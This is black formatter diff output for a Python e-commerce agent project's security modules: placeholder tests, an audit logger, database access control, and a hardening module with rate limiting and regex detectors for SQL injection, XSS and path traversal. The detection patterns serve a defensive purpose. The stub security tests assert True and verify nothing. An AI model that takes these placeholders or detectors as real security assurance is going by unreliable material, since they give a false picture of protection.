         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_message_security.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/audit_logger.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/audit_logger.py	2025-06-19 04:03:57.128705+00:00
@@ -6,10 +6,11 @@
 from typing import Any, Dict, List, Optional, Set, Union
 from uuid import uuid4
 
 from pydantic import BaseModel, ConfigDict
 
+
 # Simple VaultClient interface for audit logging
 class VaultClient:
     def __init__(self):
         pass
 
@@ -23,22 +24,29 @@
         return []
 
     async def delete_secret(self, path: str) -> bool:
         return True
 
+
 # For now, create a simple Permission enum until RBAC is migrated
 from enum import Enum
+
+
 class Permission(str, Enum):
     READ = "read"
     WRITE = "write"
     DELETE = "delete"
     ADMIN = "admin"
 
+
 # Simple logger setup
 import logging
+
+
 def get_logger(name):
     return logging.getLogger(name)
+
 
 logger = get_logger(__name__)
 
 
 class AuditEventType(str, Enum):
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/audit_logger.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_rate_limiter.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_rate_limiter.py	2025-06-19 04:03:57.180048+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from rate_limiter import *
 
+
 class TestRateLimiterSecurity:
     """Security test class for rate_limiter."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_rate_limiter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_token_manager.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_token_manager.py	2025-06-19 04:03:57.186957+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from token_manager import *
 
+
 class TestTokenManagerSecurity:
     """Security test class for token_manager."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_token_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/encryption.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/encryption.py	2025-06-19 04:03:57.207431+00:00
@@ -329,12 +329,12 @@
         try:
             # Decode hash
             decoded = base64.b64decode(password_hash)
 
             # Extract salt and hash
-            salt = decoded[:self.config.salt_size]
-            stored_hash = decoded[self.config.salt_size:]
+            salt = decoded[: self.config.salt_size]
+            stored_hash = decoded[self.config.salt_size :]
 
             # Derive hash from password
             kdf = PBKDF2HMAC(
                 algorithm=hashes.SHA256(),
                 length=32,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/encryption.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/services/__init__.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/services/__init__.py	2025-06-19 04:03:57.259652+00:00
@@ -2,6 +2,6 @@
 
 from .embeddings import EmbeddingService
 
 __all__ = [
     "EmbeddingService",
-]
\ No newline at end of file
+]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/services/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/database_security.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/database_security.py	2025-06-19 04:03:57.396836+00:00
@@ -14,11 +14,23 @@
 import inspect
 import logging
 import time
 from datetime import datetime
 from enum import Enum
-from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Type, TypeVar, Union, cast
+from typing import (
+    Any,
+    Callable,
+    Dict,
+    List,
+    Optional,
+    Set,
+    Tuple,
+    Type,
+    TypeVar,
+    Union,
+    cast,
+)
 
 from sqlalchemy import Column, String, event, select
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy.orm import DeclarativeBase, Session
 
@@ -32,27 +44,30 @@
 F = TypeVar("F", bound=Callable[..., Any])
 
 
 class SecurityLevel(str, Enum):
     """Security levels for database operations."""
+
     PUBLIC = "public"
     PROTECTED = "protected"
     PRIVATE = "private"
     SENSITIVE = "sensitive"
 
 
 class DataCategory(str, Enum):
     """Data categories for compliance and auditing."""
+
     GENERAL = "general"
     PERSONAL = "personal"
     FINANCIAL = "financial"
     HEALTH = "health"
     CONFIDENTIAL = "confidential"
 
 
 class DatabaseAction(str, Enum):
     """Database actions for permission checking."""
+
     CREATE = "create"
     READ = "read"
     UPDATE = "update"
     DELETE = "delete"
     LIST = "list"
@@ -60,85 +75,85 @@
 
 
 class DatabaseSecurityManager:
     """
     Database security manager for enforcing security policies.
-    
+
     This class provides methods for enforcing security policies on database operations,
     including row-level security, data access auditing, and permission checking.
     """
-    
+
     _instance = None
-    
+
     def __new__(cls, *args, **kwargs):
         """Singleton pattern to ensure only one security manager exists."""
         if cls._instance is None:
             cls._instance = super(DatabaseSecurityManager, cls).__new__(cls)
             cls._instance._initialized = False
         return cls._instance
-    
+
     def __init__(
         self,
         access_control: Optional[AccessControl] = None,
         enable_row_level_security: bool = True,
         enable_auditing: bool = True,
         enable_permission_checking: bool = True,
         enable_data_masking: bool = True,
     ):
         """
         Initialize the database security manager.
-        
+
         Args:
             access_control: Access control manager
             enable_row_level_security: Whether to enable row-level security
             enable_auditing: Whether to enable data access auditing
             enable_permission_checking: Whether to enable permission checking
             enable_data_masking: Whether to enable sensitive data masking
         """
         if self._initialized:
             return
-        
+
         self.access_control = access_control or AccessControl()
         self.enable_row_level_security = enable_row_level_security
         self.enable_auditing = enable_auditing
         self.enable_permission_checking = enable_permission_checking
         self.enable_data_masking = enable_data_masking
-        
+
         # Security policies by model
         self._security_policies: Dict[str, Dict[str, Any]] = {}
-        
+
         # Audit log queue
         self._audit_queue: asyncio.Queue = asyncio.Queue()
-        
+
         # Start audit log processor
         if self.enable_auditing:
             self._start_audit_processor()
-        
+
         self._initialized = True
         logger.info("Database security manager initialized")
-    
+
     def _start_audit_processor(self) -> None:
         """Start the audit log processor."""
         asyncio.create_task(self._process_audit_logs())
         logger.info("Audit log processor started")
-    
+
     async def _process_audit_logs(self) -> None:
         """Process audit logs from the queue."""
         while True:
             try:
                 # Get audit log from queue
                 audit_log = await self._audit_queue.get()
-                
+
                 # Process audit log (in a real implementation, this would write to a database or log file)
                 logger.info("Audit log: %s", audit_log)
-                
+
                 # Mark task as done
                 self._audit_queue.task_done()
             except Exception as e:
                 logger.error("Error processing audit log: %s", e)
                 await asyncio.sleep(1)  # Avoid tight loop on error
-    
+
     def register_security_policy(
         self,
         model_class: Type[DeclarativeBase],
         owner_column: Optional[str] = None,
         security_level: SecurityLevel = SecurityLevel.PROTECTED,
@@ -146,50 +161,50 @@
         permission_prefix: Optional[str] = None,
         sensitive_columns: Optional[List[str]] = None,
     ) -> None:
         """
         Register a security policy for a model.
-        
+
         Args:
             model_class: The model class
             owner_column: The column that identifies the owner of the record
             security_level: The security level of the model
             data_category: The data category of the model
             permission_prefix: The permission prefix for the model
             sensitive_columns: List of sensitive columns to mask
         """
         model_name = model_class.__name__
-        
+
         # Create security policy
         policy = {
             "model_class": model_class,
             "owner_column": owner_column,
             "security_level": security_level,
             "data_category": data_category,
             "permission_prefix": permission_prefix or model_name.lower(),
             "sensitive_columns": sensitive_columns or [],
         }
-        
+
         # Register policy
         self._security_policies[model_name] = policy
         logger.info("Registered security policy for %s", model_name)
-    
+
     def get_security_policy(self, model_class: Type[DeclarativeBase]) -> Dict[str, Any]:
         """
         Get the security policy for a model.
-        
+
         Args:
             model_class: The model class
-            
+
         Returns:
             The security policy
         """
         model_name = model_class.__name__
-        
+
         # Get policy
         policy = self._security_policies.get(model_name)
-        
+
         # If no policy exists, create a default one
         if not policy:
             policy = {
                 "model_class": model_class,
                 "owner_column": None,
@@ -197,120 +212,122 @@
                 "data_category": DataCategory.GENERAL,
                 "permission_prefix": model_name.lower(),
                 "sensitive_columns": [],
             }
             self._security_policies[model_name] = policy
-        
+
         return policy
-    
+
     async def check_permission(
         self,
         session: UserSession,
         model_class: Type[DeclarativeBase],
         action: DatabaseAction,
         resource_id: Optional[str] = None,
     ) -> bool:
         """
         Check if a user has permission to perform an action on a model.
-        
+
         Args:
             session: The user session
             model_class: The model class
             action: The database action
             resource_id: Optional resource ID for specific resource checks
-            
+
         Returns:
             True if the user has permission, False otherwise
         """
         if not self.enable_permission_checking:
             return True
-        
+
         # Get security policy
         policy = self.get_security_policy(model_class)
-        
+
         # Build permission string
         permission = f"{policy['permission_prefix']}:{action.value}"
-        
+
         # Check permission
-        return await self.access_control.has_permission(session, permission, resource_id)
-    
+        return await self.access_control.has_permission(
+            session, permission, resource_id
+        )
+
     async def apply_row_level_security(
         self,
         session: UserSession,
         model_class: Type[DeclarativeBase],
         query: Any,
     ) -> Any:
         """
         Apply row-level security to a query.
-        
+
         Args:
             session: The user session
             model_class: The model class
             query: The query to modify
-            
+
         Returns:
             The modified query
         """
         if not self.enable_row_level_security:
             return query
-        
+
         # Get security policy
         policy = self.get_security_policy(model_class)
-        
+
         # If no owner column, return query as is
         if not policy["owner_column"]:
             return query
-        
+
         # If user is admin, return query as is
         if "admin" in session.roles:
             return query
-        
+
         # Apply row-level security
         owner_column = getattr(model_class, policy["owner_column"])
         return query.where(owner_column == session.user_id)
-    
+
     def mask_sensitive_data(
         self,
         session: UserSession,
         model_class: Type[DeclarativeBase],
         data: Dict[str, Any],
     ) -> Dict[str, Any]:
         """
         Mask sensitive data in a record.
-        
+
         Args:
             session: The user session
             model_class: The model class
             data: The record data
-            
+
         Returns:
             The masked data
         """
         if not self.enable_data_masking:
             return data
-        
+
         # Get security policy
         policy = self.get_security_policy(model_class)
-        
+
         # If no sensitive columns, return data as is
         if not policy["sensitive_columns"]:
             return data
-        
+
         # If user is admin, return data as is
         if "admin" in session.roles:
             return data
-        
+
         # Create a copy of the data
         masked_data = data.copy()
-        
+
         # Mask sensitive columns
         for column in policy["sensitive_columns"]:
             if column in masked_data:
                 masked_data[column] = "********"
-        
+
         return masked_data
-    
+
     async def audit_access(
         self,
         session: UserSession,
         model_class: Type[DeclarativeBase],
         action: DatabaseAction,
@@ -318,25 +335,25 @@
         success: bool = True,
         details: Optional[Dict[str, Any]] = None,
     ) -> None:
         """
         Audit a database access.
-        
+
         Args:
             session: The user session
             model_class: The model class
             action: The database action
             resource_id: Optional resource ID
             success: Whether the access was successful
             details: Optional additional details
         """
         if not self.enable_auditing:
             return
-        
+
         # Get security policy
         policy = self.get_security_policy(model_class)
-        
+
         # Create audit log
         audit_log = {
             "timestamp": datetime.utcnow().isoformat(),
             "user_id": session.user_id,
             "action": action.value,
@@ -345,11 +362,11 @@
             "security_level": policy["security_level"],
             "data_category": policy["data_category"],
             "success": success,
             "details": details or {},
         }
-        
+
         # Add to audit queue
         await self._audit_queue.put(audit_log)
 
 
 # Decorator for securing repository methods
@@ -360,131 +377,161 @@
     apply_rls: bool = True,
     mask_data: bool = True,
 ) -> Callable[[F], F]:
     """
     Decorator for securing repository methods.
-    
+
     Args:
         action: The database action
         audit: Whether to audit the operation
         check_permission: Whether to check permission
         apply_rls: Whether to apply row-level security
         mask_data: Whether to mask sensitive data
-        
+
     Returns:
         The decorated function
     """
+
     def decorator(func: F) -> F:
         @functools.wraps(func)
         async def wrapper(self, *args, **kwargs):
             # Get security manager
             security_manager = DatabaseSecurityManager()
-            
+
             # Get user session from repository
             session = getattr(self, "user_session", None)
             if not session:
                 # If no user session, proceed without security
                 return await func(self, *args, **kwargs)
-            
+
             # Get model class from repository
             model_class = getattr(self, "model_class", None)
             if not model_class:
                 # If no model class, proceed without security
                 return await func(self, *args, **kwargs)
-            
+
             # Get resource ID if available
             resource_id = None
             if args and isinstance(args[0], str):
                 resource_id = args[0]
             elif "id" in kwargs:
                 resource_id = kwargs["id"]
-            
+
             # Check permission
             if check_permission:
                 has_permission = await security_manager.check_permission(
                     session, model_class, action, resource_id
                 )
                 if not has_permission:
                     if audit:
                         await security_manager.audit_access(
-                            session, model_class, action, resource_id, False,
-                            {"error": "Permission denied"}
+                            session,
+                            model_class,
+                            action,
+                            resource_id,
+                            False,
+                            {"error": "Permission denied"},
                         )
-                    raise PermissionError(f"Permission denied: {action.value} {model_class.__name__}")
-            
+                    raise PermissionError(
+                        f"Permission denied: {action.value} {model_class.__name__}"
+                    )
+
             try:
                 # Apply row-level security if needed
-                if apply_rls and action in [DatabaseAction.READ, DatabaseAction.LIST, DatabaseAction.SEARCH]:
+                if apply_rls and action in [
+                    DatabaseAction.READ,
+                    DatabaseAction.LIST,
+                    DatabaseAction.SEARCH,
+                ]:
                     # Get the query argument
                     sig = inspect.signature(func)
                     param_names = list(sig.parameters.keys())
-                    
+
                     # If the function has a query parameter, apply RLS
                     if "query" in param_names:
                         query_index = param_names.index("query")
                         if query_index < len(args):
                             # Query is in args
                             args_list = list(args)
-                            args_list[query_index] = await security_manager.apply_row_level_security(
-                                session, model_class, args_list[query_index]
+                            args_list[query_index] = (
+                                await security_manager.apply_row_level_security(
+                                    session, model_class, args_list[query_index]
+                                )
                             )
                             args = tuple(args_list)
                         elif "query" in kwargs:
                             # Query is in kwargs
-                            kwargs["query"] = await security_manager.apply_row_level_security(
-                                session, model_class, kwargs["query"]
+                            kwargs["query"] = (
+                                await security_manager.apply_row_level_security(
+                                    session, model_class, kwargs["query"]
+                                )
                             )
-                
+
                 # Execute the function
                 result = await func(self, *args, **kwargs)
-                
+
                 # Mask sensitive data if needed
                 if mask_data and result:
                     if isinstance(result, dict):
-                        result = security_manager.mask_sensitive_data(session, model_class, result)
+                        result = security_manager.mask_sensitive_data(
+                            session, model_class, result
+                        )
                     elif isinstance(result, list):
                         result = [
-                            security_manager.mask_sensitive_data(session, model_class, item)
-                            if isinstance(item, dict) else item
+                            (
+                                security_manager.mask_sensitive_data(
+                                    session, model_class, item
+                                )
+                                if isinstance(item, dict)
+                                else item
+                            )
                             for item in result
                         ]
                     elif hasattr(result, "to_dict"):
                         # If result has a to_dict method, use it
                         data = result.to_dict()
-                        masked_data = security_manager.mask_sensitive_data(session, model_class, data)
-                        
+                        masked_data = security_manager.mask_sensitive_data(
+                            session, model_class, data
+                        )
+
                         # Apply masked data back to result if possible
                         for key, value in masked_data.items():
                             if hasattr(result, key):
                                 setattr(result, key, value)
-                
+
                 # Audit access
                 if audit:
                     await security_manager.audit_access(
                         session, model_class, action, resource_id, True
                     )
-                
+
                 return result
             except Exception as e:
                 # Audit access failure
                 if audit:
                     await security_manager.audit_access(
-                        session, model_class, action, resource_id, False,
-                        {"error": str(e)}
+                        session,
+                        model_class,
+                        action,
+                        resource_id,
+                        False,
+                        {"error": str(e)},
                     )
                 raise
-        
+
         return cast(F, wrapper)
-    
+
     return decorator
 
 
 # Permission errors
 class PermissionError(Exception):
     """Exception raised when a user does not have permission to perform an action."""
+
     pass
 
 
 # Row-level security errors
 class RowLevelSecurityError(Exception):
     """Exception raised when row-level security prevents an action."""
+
     pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/database_security.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/services/embeddings.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/services/embeddings.py	2025-06-19 04:03:57.482184+00:00
@@ -47,23 +47,23 @@
         """
         try:
             # Create a deterministic vector based on text hash
             # This is a mock implementation for development/testing
             text_hash = hash(text)
-            
+
             # Generate a pseudo-random but deterministic vector
             np.random.seed(abs(text_hash) % (2**32))
             vector = np.random.normal(0, 1, self.VECTOR_SIZE)
-            
+
             # Normalize the vector
             norm = np.linalg.norm(vector)
             if norm > 0:
                 vector = vector / norm
-            
+
             # Convert to list of floats
             embedding = [float(x) for x in vector]
-            
+
             logger.debug(f"Generated embedding for text (length: {len(text)})")
             return embedding
 
         except Exception as e:
             logger.error("Error generating embedding: %s", str(e), exc_info=True)
@@ -81,11 +81,11 @@
         """
         embeddings = []
         for text in texts:
             embedding = await self.get_embedding(text)
             embeddings.append(embedding)
-        
+
         logger.debug(f"Generated {len(embeddings)} embeddings")
         return embeddings
 
     def get_vector_size(self) -> int:
         """Get the vector size for embeddings.
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/services/embeddings.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/security_hardening.py	2025-06-16 02:37:51.373442+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/security_hardening.py	2025-06-19 04:03:57.551866+00:00
@@ -17,75 +17,82 @@
 from fastapi import Request, HTTPException, status
 from fastapi.responses import JSONResponse
 
 logger = logging.getLogger(__name__)
 
+
 @dataclass
 class SecurityEvent:
     """Security event data structure."""
+
     event_type: str
     source_ip: str
     user_id: Optional[str]
     endpoint: str
     timestamp: datetime
     severity: str
     details: Dict[str, Any]
 
+
 @dataclass
 class RateLimitRule:
     """Rate limiting rule configuration."""
+
     requests_per_minute: int
     requests_per_hour: int
     burst_limit: int
     window_size: int = 60  # seconds
 
+
 class AdvancedRateLimiter:
     """Advanced rate limiting with sliding window and burst protection."""
-    
+
     def __init__(self):
         """Initialize the rate limiter."""
         self.request_history: Dict[str, deque] = defaultdict(deque)
         self.burst_counters: Dict[str, int] = defaultdict(int)
         self.blocked_ips: Dict[str, datetime] = {}
-        
+
         # Rate limit rules by endpoint type
         self.rules = {
-            "auth": RateLimitRule(500, 5000, 100),  # Authentication endpoints - support 100+ concurrent users
-            "api": RateLimitRule(100, 1000, 20),    # General API endpoints
-            "upload": RateLimitRule(5, 50, 2),      # File upload endpoints
-            "ai": RateLimitRule(20, 200, 5),        # AI analysis endpoints
-            "default": RateLimitRule(60, 600, 10)   # Default rate limit
+            "auth": RateLimitRule(
+                500, 5000, 100
+            ),  # Authentication endpoints - support 100+ concurrent users
+            "api": RateLimitRule(100, 1000, 20),  # General API endpoints
+            "upload": RateLimitRule(5, 50, 2),  # File upload endpoints
+            "ai": RateLimitRule(20, 200, 5),  # AI analysis endpoints
+            "default": RateLimitRule(60, 600, 10),  # Default rate limit
         }
-        
+
         logger.info("Advanced Rate Limiter initialized with endpoint-specific rules")
-    
+
     def get_client_key(self, request: Request) -> str:
         """Generate client identification key."""
         # Use IP address as primary identifier
         client_ip = self._get_client_ip(request)
-        
+
         # Add user ID if authenticated
         user_id = getattr(request.state, "user_id", None)
         if user_id:
             return f"{client_ip}:{user_id}"
-        
+
         return client_ip
-    
+
     def _get_client_ip(self, request: Request) -> str:
         """Extract client IP address from request."""
         # Check for forwarded headers (behind proxy/load balancer)
         forwarded_for = request.headers.get("X-Forwarded-For")
         if forwarded_for:
             return forwarded_for.split(",")[0].strip()
-        
+
         real_ip = request.headers.get("X-Real-IP")
         if real_ip:
             return real_ip
-        
+
         # Fallback to direct client IP
         return request.client.host if request.client else "unknown"
-    
+
     def _get_endpoint_type(self, path: str) -> str:
         """Determine endpoint type for rate limiting rules."""
         if "/auth/" in path or "/login" in path or "/register" in path:
             return "auth"
         elif "/upload" in path or "/files" in path:
@@ -94,150 +101,159 @@
             return "ai"
         elif "/api/" in path:
             return "api"
         else:
             return "default"
-    
+
     async def check_rate_limit(self, request: Request) -> bool:
         """
         Check if request should be rate limited.
-        
+
         Returns:
             True if request is allowed, False if rate limited
         """
         client_key = self.get_client_key(request)
         endpoint_type = self._get_endpoint_type(request.url.path)
         rule = self.rules.get(endpoint_type, self.rules["default"])
-        
+
         now = time.time()
         current_minute = int(now // 60)
-        
+
         # Check if IP is temporarily blocked
         if client_key in self.blocked_ips:
             if datetime.now(timezone.utc) < self.blocked_ips[client_key]:
                 return False
             else:
                 del self.blocked_ips[client_key]
-        
+
         # Initialize request history for client
         if client_key not in self.request_history:
             self.request_history[client_key] = deque()
-        
+
         history = self.request_history[client_key]
-        
+
         # Clean old entries (older than 1 hour)
         cutoff_time = now - 3600
         while history and history[0] < cutoff_time:
             history.popleft()
-        
+
         # Check burst limit (requests in last 10 seconds)
         burst_cutoff = now - 10
         recent_requests = sum(1 for timestamp in history if timestamp > burst_cutoff)
-        
+
         if recent_requests >= rule.burst_limit:
-            logger.warning(f"Burst limit exceeded for {client_key}: {recent_requests} requests in 10s")
+            logger.warning(
+                f"Burst limit exceeded for {client_key}: {recent_requests} requests in 10s"
+            )
             self._block_client(client_key, minutes=5)
             return False
-        
+
         # Check per-minute limit
         minute_cutoff = now - 60
         minute_requests = sum(1 for timestamp in history if timestamp > minute_cutoff)
-        
+
         if minute_requests >= rule.requests_per_minute:
-            logger.warning(f"Per-minute limit exceeded for {client_key}: {minute_requests} requests/min")
+            logger.warning(
+                f"Per-minute limit exceeded for {client_key}: {minute_requests} requests/min"
+            )
             return False
-        
+
         # Check per-hour limit
         hour_requests = len(history)
         if hour_requests >= rule.requests_per_hour:
-            logger.warning(f"Per-hour limit exceeded for {client_key}: {hour_requests} requests/hour")
+            logger.warning(
+                f"Per-hour limit exceeded for {client_key}: {hour_requests} requests/hour"
+            )
             return False
-        
+
         # Record this request
         history.append(now)
         return True
-    
+
     def _block_client(self, client_key: str, minutes: int = 5):
         """Temporarily block a client."""
         block_until = datetime.now(timezone.utc) + timedelta(minutes=minutes)
         self.blocked_ips[client_key] = block_until
         logger.warning(f"Temporarily blocked {client_key} until {block_until}")
 
+
 class InputValidator:
     """Advanced input validation and sanitization."""
-    
+
     def __init__(self):
         """Initialize the input validator."""
         # Dangerous patterns to detect
         self.sql_injection_patterns = [
             r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)",
             r"(--|#|/\*|\*/)",
             r"(\b(OR|AND)\s+\d+\s*=\s*\d+)",
             r"(\bUNION\s+SELECT\b)",
         ]
-        
+
         self.xss_patterns = [
             r"<script[^>]*>.*?</script>",
             r"javascript:",
             r"on\w+\s*=",
             r"<iframe[^>]*>",
             r"<object[^>]*>",
             r"<embed[^>]*>",
         ]
-        
+
         self.path_traversal_patterns = [
             r"\.\./",
             r"\.\.\\",
             r"%2e%2e%2f",
             r"%2e%2e\\",
         ]
-        
+
         logger.info("Input Validator initialized with security patterns")
-    
+
     def validate_request_data(self, data: Any) -> Dict[str, Any]:
         """
         Validate and sanitize request data.
-        
+
         Returns:
             Validation result with sanitized data and security warnings
         """
         result = {
             "valid": True,
             "sanitized_data": data,
             "warnings": [],
-            "blocked_patterns": []
+            "blocked_patterns": [],
         }
-        
+
         if isinstance(data, dict):
             result["sanitized_data"] = self._validate_dict(data, result)
         elif isinstance(data, list):
             result["sanitized_data"] = self._validate_list(data, result)
         elif isinstance(data, str):
             result["sanitized_data"] = self._validate_string(data, result)
-        
+
         result["valid"] = len(result["blocked_patterns"]) == 0
         return result
-    
-    def _validate_dict(self, data: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
+
+    def _validate_dict(
+        self, data: Dict[str, Any], result: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Validate dictionary data."""
         sanitized = {}
         for key, value in data.items():
             # Validate key
             clean_key = self._validate_string(key, result)
-            
+
             # Validate value
             if isinstance(value, dict):
                 sanitized[clean_key] = self._validate_dict(value, result)
             elif isinstance(value, list):
                 sanitized[clean_key] = self._validate_list(value, result)
             elif isinstance(value, str):
                 sanitized[clean_key] = self._validate_string(value, result)
             else:
                 sanitized[clean_key] = value
-        
+
         return sanitized
-    
+
     def _validate_list(self, data: List[Any], result: Dict[str, Any]) -> List[Any]:
         """Validate list data."""
         sanitized = []
         for item in data:
             if isinstance(item, dict):
@@ -246,122 +262,136 @@
                 sanitized.append(self._validate_list(item, result))
             elif isinstance(item, str):
                 sanitized.append(self._validate_string(item, result))
             else:
                 sanitized.append(item)
-        
+
         return sanitized
-    
+
     def _validate_string(self, data: str, result: Dict[str, Any]) -> str:
         """Validate and sanitize string data."""
         import re
-        
+
         original_data = data
-        
+
         # Check for SQL injection patterns
         for pattern in self.sql_injection_patterns:
             if re.search(pattern, data, re.IGNORECASE):
                 result["blocked_patterns"].append(f"SQL injection pattern: {pattern}")
-                result["warnings"].append(f"Potential SQL injection detected in: {data[:50]}...")
-        
+                result["warnings"].append(
+                    f"Potential SQL injection detected in: {data[:50]}..."
+                )
+
         # Check for XSS patterns
         for pattern in self.xss_patterns:
             if re.search(pattern, data, re.IGNORECASE):
                 result["blocked_patterns"].append(f"XSS pattern: {pattern}")
                 result["warnings"].append(f"Potential XSS detected in: {data[:50]}...")
                 # Remove dangerous HTML/JS
                 data = re.sub(pattern, "", data, flags=re.IGNORECASE)
-        
+
         # Check for path traversal patterns
         for pattern in self.path_traversal_patterns:
             if re.search(pattern, data, re.IGNORECASE):
                 result["blocked_patterns"].append(f"Path traversal pattern: {pattern}")
-                result["warnings"].append(f"Potential path traversal detected in: {data[:50]}...")
-        
+                result["warnings"].append(
+                    f"Potential path traversal detected in: {data[:50]}..."
+                )
+
         # Basic HTML encoding for safety
         data = data.replace("<", "&lt;").replace(">", "&gt;")
-        
+
         return data
+
 
 class ThreatDetectionSystem:
     """Advanced threat detection and response system."""
-    
+
     def __init__(self):
         """Initialize the threat detection system."""
         self.security_events: deque = deque(maxlen=10000)
         self.threat_scores: Dict[str, float] = defaultdict(float)
         self.suspicious_ips: Set[str] = set()
-        
+
         # Threat detection rules
         self.threat_thresholds = {
             "failed_auth_attempts": 5,
             "rapid_requests": 100,
             "suspicious_patterns": 3,
-            "blocked_requests": 10
+            "blocked_requests": 10,
         }
-        
+
         logger.info("Threat Detection System initialized")
-    
+
     def record_security_event(self, event: SecurityEvent):
         """Record a security event for analysis."""
         self.security_events.append(event)
-        
+
         # Update threat score for source IP
         self._update_threat_score(event)
-        
+
         # Check for immediate threats
         self._check_immediate_threats(event)
-        
-        logger.debug(f"Security event recorded: {event.event_type} from {event.source_ip}")
-    
+
+        logger.debug(
+            f"Security event recorded: {event.event_type} from {event.source_ip}"
+        )
+
     def _update_threat_score(self, event: SecurityEvent):
         """Update threat score based on event."""
         score_delta = 0
-        
+
         if event.event_type == "failed_auth":
             score_delta = 2.0
         elif event.event_type == "rate_limit_exceeded":
             score_delta = 1.5
         elif event.event_type == "suspicious_input":
             score_delta = 3.0
         elif event.event_type == "blocked_request":
             score_delta = 1.0
-        
+
         # Apply severity multiplier
         if event.severity == "high":
             score_delta *= 2.0
         elif event.severity == "critical":
             score_delta *= 3.0
-        
+
         self.threat_scores[event.source_ip] += score_delta
-        
+
         # Mark as suspicious if score exceeds threshold
         if self.threat_scores[event.source_ip] > 10.0:
             self.suspicious_ips.add(event.source_ip)
-            logger.warning(f"IP {event.source_ip} marked as suspicious (score: {self.threat_scores[event.source_ip]})")
-    
+            logger.warning(
+                f"IP {event.source_ip} marked as suspicious (score: {self.threat_scores[event.source_ip]})"
+            )
+
     def _check_immediate_threats(self, event: SecurityEvent):
         """Check for immediate threat patterns."""
         # Check for rapid failed authentication attempts
         recent_failed_auth = [
-            e for e in self.security_events
+            e
+            for e in self.security_events
             if e.source_ip == event.source_ip
             and e.event_type == "failed_auth"
-            and (datetime.now(timezone.utc) - e.timestamp).total_seconds() < 300  # 5 minutes
+            and (datetime.now(timezone.utc) - e.timestamp).total_seconds()
+            < 300  # 5 minutes
         ]
-        
+
         if len(recent_failed_auth) >= self.threat_thresholds["failed_auth_attempts"]:
-            logger.critical(f"Multiple failed auth attempts from {event.source_ip}: {len(recent_failed_auth)} in 5 minutes")
+            logger.critical(
+                f"Multiple failed auth attempts from {event.source_ip}: {len(recent_failed_auth)} in 5 minutes"
+            )
             self.suspicious_ips.add(event.source_ip)
-    
+
     def is_suspicious_ip(self, ip: str) -> bool:
         """Check if an IP is marked as suspicious."""
         return ip in self.suspicious_ips
-    
+
     def get_threat_score(self, ip: str) -> float:
         """Get current threat score for an IP."""
         return self.threat_scores.get(ip, 0.0)
